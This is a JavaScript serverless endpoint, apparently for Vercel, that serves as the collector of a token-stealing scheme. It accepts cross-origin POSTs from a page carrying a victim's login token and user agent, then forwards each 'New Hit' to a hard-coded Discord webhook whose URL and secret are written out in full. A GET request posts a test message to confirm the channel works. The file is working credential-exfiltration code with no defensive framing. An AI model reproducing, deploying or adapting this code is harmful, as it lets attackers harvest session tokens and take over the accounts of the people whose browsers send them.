export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1575123789933580393/FZjGMls7iJHxVZ0muXHjxtInSpfbZqIMZfYHvPAcT3roPZKVW6xwKco71A4YSTsBLd6e";

  // If you just open the URL in a browser (GET), send a test message
  if (req.method === "GET") {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "**TEST HIT** - The Vercel endpoint is alive and talking to Discord." })
      });
      return res.status(200).send("Test sent to Discord. Check your channel.");
    } catch (e) {
      return res.status(500).send("Error sending to Discord: " + e.message);
    }
  }

  // Handle the actual POST from the page
  if (req.method === "POST") {
    let data = req.body || {};
    if (typeof data === "string") {
      try { data = JSON.parse(data); } catch(e) {}
    }

    const tokenText = data.t ? data.t : "EMPTY (Not logged in, or app webview)";
    const content = `**New Hit**\n**Token:** \`${tokenText}\`\n**UA:** ${data.ua || "Unknown"}`;

    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: content })
      });
    } catch (err) {
      console.error("Webhook failed", err);
    }

    return res.status(204).end();
  }

  return res.status(405).end();
}
